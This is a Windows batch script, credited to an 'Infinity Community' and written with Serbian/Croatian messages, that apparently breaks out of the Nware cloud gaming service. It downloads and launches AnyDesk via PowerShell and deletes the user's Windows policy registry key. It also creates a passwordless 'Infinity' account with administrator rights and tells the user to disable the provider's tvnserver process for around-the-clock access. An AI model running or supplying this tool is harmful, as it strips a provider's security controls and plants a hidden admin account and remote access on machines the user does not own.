@echo off

echo [+] Credits:
echo [+] oxIceBear - Infinity Community -
timeout /t 1 /nobreak >nul
echo [+] oxIceBear - Infinity Community -
timeout /t 1 /nobreak >nul
echo [+] oxIceBear - Infinity Community -
timeout /t 1 /nobreak >nul
echo [+] LOGOVI:
echo [+] Detektujem NWSYS....

if exist C:\Users\Administrator (
    goto nx
) else (
    color 4
    echo [+] Pokrenuo si ovaj program na tvojoj lokalnoj masini, molim te, pokreni na Nware cloud gaming servicu.
    timeout /t 10 /nobreak >nul
    exit /b 1
)

:nx

color 3

echo [+] Downloading Anydesk..
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://download.anydesk.com/AnyDesk.exe', 'AnyDesk.exe')" >nul
echo [+] Otvaram AnyDesk...
start AnyDesk.exe
echo %color_red% [!] Konektuj se preko anydesk ali ga prvo skini i stavi sifru
pause >nul
cls

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /f

gpupdate /force

echo [+] Netuser je omogućen!

echo [+] Kreiranje novog korisnika...
net user Infinity /add
timeout /t 1 /nobreak >nul

echo [+] Dodeljivanje administratorskih privilegija korisniku Infinity...
net localgroup Administrators Infinity /add
timeout /t 1 /nobreak >nul


cls
color 12
echo [+] Limore 24/7 omogucen, samo se brebaci na novi user, takodje disableuj tvnserver u taskmgr
pause
